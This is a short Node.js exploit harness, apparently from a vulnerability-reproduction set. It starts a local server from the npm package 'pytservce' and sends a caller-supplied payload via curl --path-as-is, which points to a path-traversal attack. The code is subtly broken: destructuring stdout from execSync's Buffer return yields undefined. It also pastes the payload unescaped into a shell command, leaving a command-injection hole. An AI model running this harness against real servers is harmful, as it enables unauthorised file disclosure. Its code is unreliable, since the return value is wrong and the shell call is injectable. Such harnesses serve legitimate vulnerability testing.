const { execSync } = require("child_process");
const path = require("path");
const sleep = require("sleep");

function exploitFunction(payload) {
  // Start the server
  execSync("node ./node_modules/pytservce/index.js &");

  // Wait for the server to start
  sleep.sleep(2);

  // Send the malicious request
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
  const { stdout } = require("child_process").execSync(attack_string);

  // Return the response
  return stdout;
}

module.exports = { exploitFunction };